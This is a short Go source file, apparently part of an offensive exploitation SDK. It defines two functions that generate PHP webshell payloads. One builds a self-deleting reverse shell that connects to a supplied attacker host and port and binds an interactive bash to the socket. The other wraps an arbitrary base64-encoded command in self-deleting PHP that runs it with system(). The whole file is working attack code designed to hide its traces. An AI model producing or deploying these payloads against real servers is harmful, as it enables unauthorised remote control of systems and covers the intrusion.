package sdk

// PHPReverseShell returns complete PHP code for a reverse shell (webshell drop).
// Uses proc_open to bind stdin/stdout/stderr to the socket. Self-deletes after execution.
func PHPReverseShell(lhost string, lport int) string {
	return Sprintf(
		`<?php unlink(__FILE__);$s=fsockopen("%s",%d);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes); ?>`,
		lhost, lport,
	)
}

// PHPSystem wraps a shell command in PHP for webshell execution.
// The command is base64-encoded for safe transport. Self-deletes after execution.
func PHPSystem(cmd string) string {
	return Sprintf(`<?php unlink(__FILE__);system(base64_decode("%s")); ?>`, Base64Encode(cmd))
}
